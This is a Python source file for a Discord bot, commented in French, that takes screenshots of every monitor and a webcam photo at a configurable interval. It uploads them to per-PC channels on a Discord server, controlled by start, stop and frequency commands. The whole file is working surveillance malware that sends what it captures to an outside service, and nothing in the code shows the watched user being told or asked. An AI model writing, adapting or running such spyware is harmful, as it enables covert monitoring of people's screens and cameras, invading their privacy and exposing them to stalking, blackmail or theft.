import nextcord
import platform
import subprocess
import time
import cv2
import asyncio
from mss import mss, tools
from nextcord.ext import commands, tasks
import os

# Configuration du bot
TOKEN = "Your Token"
SERVER_ID = 000000000


intents = nextcord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="+", intents=intents, help_command=None)

# Fréquence des captures 
CAPTURE_INTERVAL = 10  # secondes
capture_task = None 

def get_temp_dir():
    return os.environ.get('TEMP', '/tmp')

def get_pc_name():
    return platform.node().replace(" ", "-")

async def create_category_and_channels(guild, pc_name, screen_count):
    category = await guild.create_category(f"{pc_name}")
    control_channel = await guild.create_text_channel("control", category=category)
    screen_channels = [await guild.create_text_channel(f"screen-{i+1}", category=category) for i in range(screen_count)]
    cam_channel = await guild.create_text_channel("cam", category=category)
    return control_channel, screen_channels, cam_channel

async def find_or_create_channels(guild, pc_name, screen_count):
    category = nextcord.utils.get(guild.categories, name=pc_name)
    if not category:
        return await create_category_and_channels(guild, pc_name, screen_count)
    
    control_channel = nextcord.utils.get(category.channels, name="control")
    screen_channels = {ch.name: ch for ch in category.channels if ch.name.startswith("screen")}
    cam_channel = nextcord.utils.get(category.channels, name="cam")
    
    if not control_channel:
        control_channel = await guild.create_text_channel("control", category=category)
    
    missing_screens = [i for i in range(1, screen_count + 1) if f"screen-{i}" not in screen_channels]
    for i in missing_screens:
        screen_channels[f"screen-{i}"] = await guild.create_text_channel(f"screen-{i}", category=category)
    
    if not cam_channel:
        cam_channel = await guild.create_text_channel("cam", category=category)
    
    return control_channel, [screen_channels[f"screen-{i}"] for i in range(1, screen_count + 1)], cam_channel

@tasks.loop(seconds=CAPTURE_INTERVAL)
async def send_screenshots_and_camera_photos(screen_channels, cam_channel):
    with mss() as sct:
        for i, monitor in enumerate(sct.monitors[1:], start=1):
            screenshot = sct.grab(monitor)
            screenshot_filename = os.path.join(get_temp_dir(), f"monitor_{i}.png")
            tools.to_png(screenshot.rgb, screenshot.size, output=screenshot_filename)
            with open(screenshot_filename, "rb") as f:
                await screen_channels[i-1].send(file=nextcord.File(f))
            os.remove(screenshot_filename)
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            camera_filename = os.path.join(get_temp_dir(), "camera_photo.png")
            cv2.imwrite(camera_filename, frame)
            with open(camera_filename, "rb") as f:
                await cam_channel.send(file=nextcord.File(f))
            os.remove(camera_filename)
        cap.release()

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    guild = nextcord.utils.get(bot.guilds, id=SERVER_ID)
    if guild:
        pc_name = get_pc_name()
        with mss() as sct:
            screen_count = len(sct.monitors) - 1
        global control_channel, screen_channels, cam_channel
        control_channel, screen_channels, cam_channel = await find_or_create_channels(guild, pc_name, screen_count)
    else:
        print(f"Server with ID {SERVER_ID} not found.")

@bot.command()
async def start_capture(ctx):
    global capture_task
    if send_screenshots_and_camera_photos.is_running():
        await ctx.send("La capture est déjà en cours.")
    else:
        send_screenshots_and_camera_photos.start(screen_channels, cam_channel)
        await ctx.send("Capture d'écran et caméra activées.")

@bot.command()
async def stop_capture(ctx):
    global capture_task
    if send_screenshots_and_camera_photos.is_running():
        send_screenshots_and_camera_photos.cancel()
        await ctx.send("Capture d'écran et caméra arrêtées.")
    else:
        await ctx.send("Aucune capture en cours.")

@bot.command()
async def set_frequency(ctx, seconds: int):
    global CAPTURE_INTERVAL
    if seconds < 1:
        await ctx.send("Intervalle invalide. Minimum : 1 seconde.")
    else:
        CAPTURE_INTERVAL = seconds
        send_screenshots_and_camera_photos.change_interval(seconds=CAPTURE_INTERVAL)
        await ctx.send(f"Intervalle de capture réglé à {CAPTURE_INTERVAL} secondes.")

@bot.command(name='help')
async def bot_help(ctx):
    help_text = """
    **Commandes disponibles :**
    `!start_capture` - Démarre la capture d'écran et de la caméra.
    `!stop_capture` - Arrête la capture.
    `!set_frequency <seconds>` - Définit l'intervalle de capture.
    `!help` - Affiche ce message d'aide.
    """
    await ctx.send(help_text)

bot.run(TOKEN)
